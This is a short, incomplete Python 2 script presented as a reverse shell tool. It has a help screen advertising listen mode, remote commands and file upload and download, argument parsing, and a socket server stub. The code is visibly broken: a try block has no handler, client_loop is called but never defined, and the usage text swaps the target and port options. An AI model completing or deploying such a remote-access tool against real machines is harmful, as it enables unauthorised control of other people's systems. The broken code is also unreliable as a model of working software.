import sys
import time
import socket
import getopt
import threading
import subprocess

def help():
    print 'Python Reverse Shell'
    print
    print 'python reverse_shell.py -l -p <desired_port>'
    print 'python reverse_shell.py -t <target_port> -p <target_ip>'
    print
    print '-l --listen\t\t\t\t activate listen_mode'
    print '-t --target\t\t\t\t target_ip, host_ip if listen_mode'
    print "-p --port\t\t\t\t target_port, host_port if listen_mode"
    print "-h --help\t\t\t\t usage promt"
    print '<save_name> #download# <file_name>\t downloads <file_name> and saves as <save_name>'
    print '<save_name> #uploads# <file_name>\t uploads <file_name> and saves as <save_name>'
    print
    sys.exit(0)

def server_loop(target_ip, target_port):
    if not len(target_ip):
        target_ip = '0.0.0.0'
    
    try:
        print 'Starting server on %s:%d' % (target_ip, target_port)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((target_ip, target_port))
        server.listen(1)
        print 'Server running on %s:%d' % (target_ip, target_port)

def main():
    listen_mode = False
    target_ip = ''
    target_port = 0

    if not len(sys.argv[1:]):
        help()
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hlt:p:",
        ["help", "listen", "target", "port"])
    except getopt.GetoptError as err:
        print str(err)
        help()

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            help()
        elif opt in ("-l", "--listen"):
            listen_mode = True
        elif opt in ("-t", "--target"):
            target_ip = arg
        elif opt in ("-p", "--port"):
            target_port = int(arg)
        else:
            assert False, "Invalid Parameter"
    
    if listen_mode and target_port != 0:
        server_loop(target_ip, target_port)
    elif target_port != 0 and len(target_ip):
        client_loop(target_ip, target_port)
    else:
        help()

main()